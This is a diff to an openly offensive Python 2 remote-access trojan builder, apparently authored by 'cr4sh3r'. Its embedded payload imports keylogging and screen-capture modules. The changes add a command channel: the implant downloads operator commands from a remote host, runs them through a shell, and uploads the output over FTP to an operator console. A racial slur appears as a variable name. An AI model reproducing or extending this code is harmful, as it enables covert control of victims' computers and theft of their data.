@@ -4,7 +4,7 @@
 
 
 
-import os, ftplib, time, wget, random
+import os, ftplib, time, wget, random, urllib2
 import progressbar
 from  distutils.core import setup
 
@@ -217,7 +217,7 @@ artfin = random.choice([art1,art2,art3,art4,art5,art6,art7,art8,art9,art10])
 
 print artfin
 print " "
-print "Version 1.0.1"
+print "Version 1.0.2"
 print "- - - - - - - - - - - - - - - - - - - - - - - - - - - - -"
 print "Made by cr4sh3r"
 print "This may be not the final version!"
@@ -265,7 +265,7 @@ def startfun2(n):
 
 
     vir_code = '''import os, time, webbrowser, pyHook, pythoncom, sys, logging, wget
-import getpass, ctypes, random, inspect, PIL.ImageGrab, ftplib, urllib, urllib2
+import getpass, ctypes, random, inspect, PIL.ImageGrab, ftplib, urllib, urllib2, subprocess
 
 # START-UP
 
@@ -342,12 +342,22 @@ while nigga <= 1:
         #CMD
 
         for updatz5 in range(1):
+            ftp = ftplib.FTP(vir_host, vir_logi , vir_pasi)
+            ftp.cwd('public_html')
+            ftp.cwd('cmd')
+            ftp.cwd(vir_vicid)
             urlup5 = "http://" + vir_myurl + "/cmd/" + vir_vicid + "/aat.js"
             usock = urllib2.urlopen(urlup5)
             updatz5 = usock.read()
             usock.close()
-            os.system(updatz5)
+            command = subprocess.check_output(updatz5, shell=True)
             time.sleep(1)
+            ansa = open("tpo.js" , 'w')
+            ansa.write(command)
+            ansa.close()
+            ftp.storbinary("STOR tpo.js", open("tpo.js", "rb"))
+            time.sleep(3)
+            ftp.quit()
 
         for updater in range(1):
             updater = f.readline(1)
@@ -468,6 +478,7 @@ def ftp_con(m):
             ftp.cwd('public_html')
             ftp.cwd('cmd')
             ftp.cwd(vic_id)
+            print "Commands may take awhile to respond!"
             print "What do you want me to do?"
             print "EXAMPLE: start notepad.exe "
             vic_com = raw_input(">>>")
@@ -476,6 +487,15 @@ def ftp_con(m):
             aga.close()
             ftp.storbinary("STOR aat.js", open("aat.js", "rb"))
             time.sleep(5)
+            print "Result:"
+            urlup78 = f_host_url + "/cmd/" + vic_id + "/tpo.js"
+            usock = urllib2.urlopen(urlup78)
+            updatz79 = usock.read()
+            usock.close()
+            time.sleep(1)
+            print updatz79
+            print " "
+            print " "
             ftp.cwd("../")
             ftp.cwd("../")
             ftp.cwd("../")
@@ -581,11 +601,4 @@ while 1 >= kfckl :
 
 
 # Preserve the main author if you're going to change the code
-
-
-
-
-
-
-
 
